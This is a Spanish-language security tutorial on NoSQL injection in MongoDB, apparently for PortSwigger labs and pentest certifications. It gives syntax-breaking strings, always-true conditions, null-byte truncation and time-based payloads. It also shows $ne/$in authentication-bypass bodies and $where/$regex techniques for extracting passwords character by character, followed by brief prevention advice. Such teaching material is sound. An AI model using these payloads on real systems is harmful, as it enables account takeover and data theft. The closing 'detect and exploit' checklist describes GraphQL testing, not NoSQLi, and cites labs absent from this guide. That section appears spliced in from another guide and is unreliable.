---
title: NoSQLI guide
description: Guía sobre NoSQLI
date: 2025-11-21 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Guides
tags:
  - Portswigger Guides
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

`Explicación técnica de la vulnerabilidad NoSQLI`. Detallamos cómo `identificar` y `explotar` estas `vulnerabilidad`. Además, exploramos `estrategias clave para prevenirla`

---

## ## NoSQLI

Una `NoSQLI` es una `vulnerabilidad` en la que un `atacante` puede `interferir` con las `consultas que una aplicación realiza a una base de datos NoSQL`. Una `NoSQLI` puede permitir a un `atacante` las siguientes cosas:

- `Saltar mecanismos de autenticacióno protección`

- `Extraer o modificar datos`

- `Causar una denegación de servicio`

- `Ejecutar código en el servidor`

`Las bases de datos NoSQL almacenan y recuperan datos en un formato diferente a las tablas relacionales SQL tradicionales`. `Usan una amplia variedad de lenguajes de consulta en lugar de un estándar universal como SQL, y tienen menos restricciones relacionales`

## Bases de datos NoSQL

`Las bases de datos NoSQL almacenan y recuperan datos en un formato distinto al de las tablas relacionales SQL tradicionales`. Están `diseñadas` para `manejar grandes volúmenes de datos no estructurados o semiestructurados`. Debido a esto, suelen tener `menos restricciones relacionales` y `menos comprobaciones de consistencia que SQL`, y `ofrecen beneficios importantes` en `términos` de `escalabilidad`, `flexibilidad` y `rendimiento`

Al igual que en las `bases de datos SQL`, `los usuarios interactúan con los datos mediante consultas que la aplicación envía a la base de datos`. Sin embargo, `diferentes bases de datos NoSQL utilizan una amplia variedad de lenguajes de consulta en lugar de un estándar universal como SQL`. Estos pueden ser `lenguajes personalizados` o `lenguajes comunes` como `XML` o `JSON`

## Modelos de bases de datos NoSQL

Hay una `gran variedad` de `bases de datos NoSQL`. `Para detectar vulnerabilidades en una base de datos NoSQL`, es útil `identificar` el `modelo` y el `lenguaje` que `utiliza`

Algunos `tipos comunes` de `bases de datos NoSQL` incluyen:

- `Document stores` - `Almacenan datos` en `documentos flexibles` y `semiestructurados`. Suelen usar `formatos` como `JSON`, `BSON` y `XML`. Se `consultan` mediante `APIs` o `lenguajes de consulta`. Ejemplos: `MongoDB`, `Couchbase`

- `Key-value stores` - `Almacenan datos en formato clave-valor`. Cada `campo de datos` está `asociado` a una `clave única`. `Los valores se recuperan usando esa clave`. Ejemplos: `Redis`, `Amazon DynamoDB`

- `Wide-column stores` - `Organizan los datos relacionados en familias de columnas flexibles en lugar de filas tradicionales`. Ejemplos: `Apache Cassandra`, `Apache HBase`

- `Graph databases` - `Usan nodos para almacenar entidades y aristas para almacenar relaciones entre entidades`. Ejemplos: `Neo4j`, `Amazon Neptune`

## NoSQL syntax injection

`Podemos detectar potenciales vulnerabilidades de NoSQL injection intentando romper la sintaxis de la consulta`. Para ello, `debemos testear sistemáticamente cada entrada enviando cadenas y caracteres especiales con el objetivo de provocar un error en la base de datos u otro comportamiento detectable`

Si `conocemos` el `lenguaje` de la `API` de la `base de datos objetivo`, debemos usar `caracteres especiales y cadenas relevantes para ese lenguaje`. De lo contrario, usaremos `cadenas globales` que `ataquen múltiples lenguajes de API`

### Detectar una syntax injection en MongoDB

Consideremos una `aplicación de compras que muestra productos en diferentes categorías`. `Cuando el usuario selecciona la categoría Fizzy drinks, su navegador solicita la siguiente URL`:

```
https://insecure-website.com/product/lookup?category=fizzy
```

Esto hace que `la aplicación envíe una consulta JSON para recuperar los productos relevantes de la colección product en la base de datos MongoDB`:

```
this.category == 'fizzy'
```

Para `testear` si la `entrada` puede ser `vulnerable`, enviamos una `cadena` como `valor` del `parámetro category`. Un ejemplo de `cadena` para `MongoDB` es:

```
'"`{\r;$Foo}\n$Foo \xYZ`
```

Usamos esta `cadena` para `construir` el siguiente `ataque`:

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

`Si esto provoca un cambio respecto a la respuesta original, puede indicar que la entrada del usuario no está filtrada o sanitizada correctamente`

Las `vulnerabilidades` de `NoSQL injection` pueden `ocurrir` en `diversos contextos`, por lo tanto, `tenemos que adaptar las cadenas que enviemos`. De lo contrario, `solo provocaríamos errores de validación que harían que la aplicación ni siquiera ejecute la consulta`

En este ejemplo, estamos `inyectando` la `cadena` mediante la `URL`, por lo que la `cadena` está `URL encodeada`. `En algunas aplicaciones, puede ser necesario inyectar el payload mediante en formato JSON`. En ese caso, este `payload` se `convertiría` en este:

```
\"`{\r;$Foo}\n$Foo \\xYZ\u0000`
```

### Determinar qué caracteres son procesados

`Para determinar qué caracteres interpreta la aplicación como sintaxis`, podemos `inyectar caracteres individuales`. Por ejemplo, podemos `enviar '`, lo cual da como `resultado` la siguiente `consulta` en `MongoDB`:

```
this.category == '''
```

`Si esto provoca un cambio respecto a la respuesta original, puede indicar que el carácter ' ha roto la sintaxis de la consulta y ha causado un error de sintaxis`. `Podemos confirmarlo enviando una cadena válida escapando la comilla, así`:

```
this.category == '\\''
```

`Si esto no causa un error de sintaxis puede significar que la aplicación es vulnerable a un ataque de inyección`

### Confirmar comportamiento condicional

Después de `detectar` una `vulnerabilidad`, el siguiente paso es `determinar si podemos influir en condiciones booleanas usando la sintaxis de NoSQL`

Para probar esto, `enviamos dos solicitudes`, `una con una condición falsa` y `otra con una verdadera`. Por ejemplo, podemos `usar` estas `dos expresiones`:

```
' && 0 && 'x
```

```
' && 1 && 'x
```

Se `vería` de esta `forma` en una `URL`:

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

Si la `aplicación` se `comporta` de `manera diferente`, esto `sugiere` que `la condición falsa afecta a la lógica de la consulta, pero la verdadera no`. Esto `indica` que `inyectar este estilo de sintaxis está afectando a una consulta del lado del servidor`

### Sobrescribir condiciones existentes

Ahora que hemos `identificado` que podemos `influir` en `condiciones booleanas`, `podemos intentar sobrescribir condiciones existentes para explotar la vulnerabilidad`. Por ejemplo, `podemos inyectar una condición JavaScript que siempre se evalúe como verdadera`, como:

```
'||'1'=='1
```

Ejemplo:

```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

Esto `resulta` en la siguiente `consulta` de `MongoDB`:

```
this.category == 'fizzy'||'1'=='1'
```

`Como la condición inyectada siempre es verdadera, la consulta modificada devuelve todos los elementos`. `Esto permite ver todos los productos de cualquier categoría, incluidas categorías ocultas o desconocidas`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Detecting NoSQL injection - [https://justice-reaper.github.io/posts/NoSQLI-Lab-1/](https://justice-reaper.github.io/posts/NoSQLI-Lab-1/)

`También podemos añadir un carácter nulo después del valor de la categoría. MongoDB puede ignorar todos los caracteres después de un carácter nulo`. Esto significa que `cualquier condición adicional en la consulta de MongoDB es ignorada`. Por ejemplo, la `consulta` podría tener una `restricción adicional this.released`:

```
this.category == 'fizzy' && this.released == 1
```

La `restricción this.released == 1` se usa para `mostrar únicamente los productos que están publicados`. Para los `productos no publicados`, probablemente se usará `this.released == 0`

En este caso, un `atacante` podría `construir` un `ataque` como el siguiente:

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Esto `generaría` la siguiente `consulta NoSQL`:

```
this.category == 'fizzy'\u0000' && this.released == 1
```

`Si MongoDB ignora todos los caracteres después del carácter nulo, esto elimina el requisito de que el campo released sea igual a 1`. Como `resultado`, `se muestran todos los productos de la categoría fizzy, incluidos los productos no publicados`

### Advertencia

`Debemos tener cuidado al inyectar condiciones que siempre evalúan como verdaderas en una consulta NoSQL`. Aunque pueda parecer `inofensivo` en el `contexto inicial`, es `común` que `las aplicaciones reutilicen los datos de una misma solicitud en múltiples consultas diferentes`

`Si la aplicación usa ese dato al actualizar o eliminar información`, esto podría `provocar una pérdida accidental de datos`

## Time based injection

A veces, `provocar un error en la base de datos no produce ninguna diferencia en la respuesta de la aplicación`. En esta situación, `aún podemos detectar y explotar la vulnerabilidad usando un JavaScript injection para provocar un delay condicinal`

Para llevar a cabo una `NoSQLI time based` debemos:

- `Recargar la página varias veces para determinar el tiempo base que tarda en cargar`

- `Insertar` un `timing based payload` en la `entrada`. `Usar` un `payload` que `provoque` un `retraso intencional` en la `respuesta` cuando se `ejecuta`. Por ejemplo, `este payload {"$where": "sleep(5000)"} causa un retraso intencional de 5000 ms cuando la inyección es exitosa`

- `Identificar si la respuesta tarda más en cargar, lo cual indicaría que la inyección ha sido exitosa`

`Los siguientes payloads provocarán un retardo si la contraseña empieza por la letra a`:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

## NoSQL operator injection

`Las bases de datos NoSQL suelen usar operadores de consulta que permiten especificar condiciones que los datos deben cumplir para ser incluidos en el resultado de la consulta`. Ejemplos de `operadores de consulta de MongoDB`:

- `$where` - `Coincide` con `documentos` que `cumplen` una `expresión JavaScript`
    
- `$ne` - `Coincide con todos los valores que **no** son iguales a un valor especificado`
    
- `$in` - `Coincide con todos los valores especificados en un array`
    
- `$regex` - `Selecciona documentos cuyos valores coinciden con una expresión regular dada`

`Podemos inyectar operadores de consulta para manipular consultas NoSQL`. Para ello, `debemos enviar diferentes operadores en varias entradas de usuario` y `revisar las respuestas en busca de errores u otros cambios`

### Enviar query operators

`En mensajes en formato JSON, podemos insertar operadores como objetos anidados`. Por ejemplo, `esto`:

```
{"username":"wiener"}
```

Se `convierte` en `esto`:

```
{"username":{"$ne":"invalid"}}
```

`Para entradas basadas en URL, podemos insertar operadores mediante parámetros de URL`. Por ejemplo, `esto`:

```
username=wiener
```

Se `convierte` en `esto`:  

```
username[$ne]=invalid
```

`Si no funciona, podemos intentar lo siguiente`:

- `Convertir` el `método de la solicitud` de `GET a POST`
    
- `Cambiar` la `cabecera Content-Type` a `application/json`
    
- `Añadir un JSON al body del mensaje`
    
- `Inyectar operadores en el JSON`

Podemos usar la `extensión Content Type Converter` de `Burpsuite` para `convertir automáticamente el método de la solicitud y transformar una petición por POST con la data en formato URL-encoded a formato JSON`

### Detectar un operator injection en MongoDB

Consideremos una `aplicación vulnerable` que `acepta` un `username` y `password` en el `body` de una `solicitud por POST`:

```
{"username":"wiener","password":"peter"}
```

`Testeamos cada entrada con varios operadores`. Por ejemplo, `para comprobar si el campo username procesa un operador, podemos intentar hacer lo siguiente`:

```
{"username":{"$ne":"invalid"},"password":"peter"}
```

`Si el operador $ne se aplica, realizará consulta todos los usuarios cuyo username no sea invalid`

`Si tanto username como password procesan operadores, es posible bypassear la autenticación con el siguiente payload`:

```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

`Esta consulta devuelve todas las credenciales donde username y password no son invalid`. Como resultado, `iniciamos sesión como el primer usuario de la colección`

Para `apuntar` a una `cuenta concreta`, podemos `construir` un `payload` que `incluya` un `username conocido o adivinado`. Por ejemplo:

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Exploiting NoSQL operator injection to bypass authentication - [https://justice-reaper.github.io/posts/NoSQLI-Lab-2/](https://justice-reaper.github.io/posts/NoSQLI-Lab-2/)

## Explotar un syntax injection para extraer datos

En muchas `bases de datos NoSQL`, algunos `operadores` o `funciones` pueden `ejecutar JavaScript` pero con `limitaciones`, como el `operador $where` de `MongoDB` o la `función mapReduce()`. Esto significa que, `si una aplicación vulnerable usa estos operadores o funciones, la base de datos puede evaluar el código JavaScript como parte de la consulta`. Por lo tanto, podemos usar `funciones JavaScript` para `extraer datos de la base de datos`

### Exfiltrar datos en MongoDB

Consideremos una `aplicación vulnerable` que `permite a los usuarios buscar a otros usuarios registrados y muestra su rol`. Esto `genera` esta `solicitud` en la `URL`:

```
https://insecure-website.com/user/lookup?username=admin
```

Esto produce la siguiente `consulta NoSQL` sobre la `colección users`:

```
{"$where":"this.username == 'admin'"}
```

Como la `consulta` usa el `operador $where`, `podemos intentar inyectar funciones JavaScript para que devuelva datos sensibles`. Por ejemplo, `podemos enviar el siguiente payload`:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

Esto `devuelve` el `primer carácter` de la `contraseña` del `usuario`, permitiendo `extraer la contraseña carácter por carácter`

También podemos usar la `función JavaScript match()` para `extraer información`. Por ejemplo, `el siguiente payload permite identificar si la contraseña contiene dígitos`:

```
admin' && this.password.match(/\d/) || 'a'=='b
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Exploiting NoSQL injection to extract data - [https://justice-reaper.github.io/posts/NoSQLI-Lab-3/](https://justice-reaper.github.io/posts/NoSQLI-Lab-3/)

#### Identificar el nombre de los campos

`Como MongoDB maneja datos semiestructurados que no requieren un esquema fijo`, puede ser necesario `identificar` los `campos válidos` de la `colección` antes de poder `extraer datos mediante un JavaScript injection`

Por ejemplo, `para identificar si la base de datos MongoDB contiene un campo password, podríamos enviar el siguiente payload`:

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

`Enviamos el payload otra vez usando un campo existente y usando un campo que no existe`. En este ejemplo, sabemos que `el campo username existe`, así que podemos `enviar` estos `payloads`:

```
admin' && this.username!='
```

```
admin' && this.foo!='
```

`Si el campo password existe`, esperamos que la `respuesta` sea `idéntica` a la del `campo existente username` pero `diferente` a la del `campo inexistente foo`

`Si queremos probar diferentes nombres de campo`, podemos realizar un `ataque de fuerza bruta` usando un `diccionario` para `iterar sobre posibles nombres de campos`

## Explotar un NoSQL operator injection para extraer datos

`Aunque la consulta original no use operadores que permitan ejecutar código JavaScript arbitrario, nosotros podemos inyectar uno de estos operadores`. Posteriormente, `usamos condiciones booleanas para determinar si la aplicación ejecuta el código JavaScript que inyectamos mediante ese operador`

### Inyección de operadores en MongoDB

Imaginemos una `aplicación vulnerable` que acepta `username` y `password` en el `body` de una `petición por POST`:

```
{"username":"wiener","password":"peter"}
```

Para `comprobar` si podemos `inyectar operadores`, debemos intentar `añadir` el `operador $where` como `parámetro adicional` y `enviar` una `petición` cuya `condición sea falsa` y otra cuya `condición sea verdadera`. Por ejemplo:

```
{"username":"wiener","password":"peter", "$where":"0"}
```

```
{"username":"wiener","password":"peter", "$where":"1"}
```

Si hay una `diferencia` entre las `respuestas`, esto puede `indicar` que la `expresión JavaScript` que hay `dentro` de la `cláusula $where` está siendo `evaluada`

### Extracción de nombres de campos

`Si hemos inyectado un operador que permite ejecutar JavaScript`, podemos usar `keys()` para `extraer` los `nombres` de los `campos`. Por ejemplo, podemos `enviar` el siguiente `payload`:

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Esto `inspecciona` el `primer campo` del `objeto user` y `devuelve` el `primer carácter` del `nombre del campo`. Esto nos permite `extraer el nombre del campo carácter por carácter`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Exploiting NoSQL operator injection to extract unknown fields - [https://justice-reaper.github.io/posts/NoSQLI-Lab-4/](https://justice-reaper.github.io/posts/NoSQLI-Lab-4/)

### Exfiltración de datos usando operadores

`También podemos extraer datos usando operadores que no permiten ejecutar código JavaScript`. Por ejemplo, podemos `usar` el `operador $regex` para `extraer datos carácter por carácter`

`Imaginemos` una `aplicación vulnerable` que acepta `username` y `password` en el `body` de una `petición por POST`. Por ejemplo:

```
{"username":"myuser","password":"mypass"}
```

`Podemos empezar comprobando si el operador $regex es procesado`:

```
{"username":"admin","password":{"$regex":"^.*"}}
```

Si la `respuesta` de esta `petición` es `diferente` de la `respuesta que obtenemos al enviar una contraseña incorrecta`, esto `indica` que `la aplicación podría ser vulnerable`

`Posteriormente, podemos usar $regex para extraer datos carácter por carácter`. Por ejemplo, `este payload comprueba si la contraseña empieza por a`:

```
{"username":"admin","password":{"$regex":"^a*"}}
```

## Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

## ¿Cómo detectar y explotar un NoSQLI?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1. `Instalar` las extensiones `InQL` y `Content Type Converter` de `Burpsuite`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Si Burpsuite no encuentra el endpoint de GraphQL`, vamos a `fuzzear` usando los `payloads` que nos proporciona `Hacktricks` [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#directory-brute-force-attacks-and-graphql](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#directory-brute-force-attacks-and-graphql) y si no encontramos nada, usaremos los `diccionarios` de `SecLists`. Como `fuzzer` podemos usar `Burpsuite` o `ffuf`

5. Una vez `encontramos` el `endpoint` de `GraphQL`, vamos a `identificar` el `punto de inyección` mediante este `payload query=query{__typename}`, ya sea en `formato JSON {"query":"query{__typename}"}` o en `formato form-url encoded query=query%7b__typename%7d`. El `formato JSON se puede enviar solo en el body` y el `formato form-url encoded se puede enviar tanto en la URL como en el body` 

6. Abrimos el `Repeater` y nos `dirigimos` a la `pestaña GraphQL`. El siguiente paso es `realizar una consulta de introspección`, para ello hacemos `click derecho > GraphQL > Set introspection query`

7. En el caso de que la `consulta de introspección` esté siendo `bloqueada` o no `pueda realizarse`, vamos a intentar `enviar` el `payload` mediante un `método de solicitud alternativo`, ya que la `introspección` solo se puede `desactivar` para el `método POST`. Podríamos probar una `solicitud por GET`, una `solicitud por POST` con el `Content-Type: application/x-www-form-urlencoded` o también una `solicitud por GET` pero `mandando` la `data` en el `body`, ya sea como `JSON` o como `form-url encoded`. Esto se hace porque `GraphQL solo puede ser deshabilitado para el método POST`

8. `En el caso en el sigamos sin poder realizar la consulta de introspección`, vamos a probar a `añadir caracteres` como `espacios`, `saltos de línea` y `comas`, ya que `GraphQL` los `ignora`, pero las `expresiones regulares que puede haber implementado los desarolladores no`

9. `Una vez consigamos realizar la consulta de introspección`, vamos a `guardar los resultados en el Site map`, para ello, pulsamos `click derecho en la respuesta > GraphQL > Save GraphQL queries to site map`. `Esto lo hacemos para ver si hay consultas interesantes`

10. Vamos ahora a utilizar `InQL`, podemos simplemente `hacer click derecho > Extensions > InQL - GraphQL Scanner > Generate queries` o `importar` en `formato JSON` el `schema de GraphQL`  que hemos `obtenido` al `realizar` la `introspección`. `Es recomendable utilizar esta herramienta porque puede permitirnos obtener información adicional`

11. Para `visualizar` los `resultados` de la `introspección` hacemos `click derecho la respuesta > Extensions > InQL - GraphQL Scanner > Open in GraphQL Voyager`

12. Ya sea desde la `extensión InQL` o desde el `Site map`, las `consultas` que consideremos `interesantes`, las `enviaremos` al `Repeater` y desde allí llevaremos a cabo la `extracción de información`. En caso de ser `necesario`, también podemos `enviar` la `petición` al `Intruder` y `ejecutar un ataque de tipo Sniper` para `iterar sobre un valor numérico`, por ejemplo

13. `Si no encontramos nada interesante`, vamos a intentar `realizar` un `ataque de fuerza bruta` al `login` usando `alias`. Para ello, nos `dirigimos` al `cuarto laboratorio` y `seguimos los pasos que se comparten`

14. En el caso de poder `cambiar nuestro email` o `asociar nuestra cuenta con un email`, `podemos ver si se realiza mediante GraphQL` y `checkear si tiene o no un token CSRF`. `Si no tiene token CSRF, podemos intentar llevar a cabo un ataque CSRF mediante GraphQL`. Si nos `surge` alguna `duda`, es recomendable `seguir las instrucciones del quinto laboratorio`

## ¿Cómo prevenir una NoSQLI?

`La forma adecuada de prevenir ataques de NoSQL injection depende de la tecnología NoSQL específica que estemos utilizando`. Por ello, `se recomienda leer la documentación de seguridad de la base de datos NoSQL que usemos`. Aun así, las siguientes `pautas generales` también `ayudan`:

- `Sanitizar y validar la entrada del usuario`, usando una `allowlist de caracteres aceptados`

- `Insertar la entrada del usuario mediante consultas parametrizadas en lugar de concatenarla directamente en la consulta`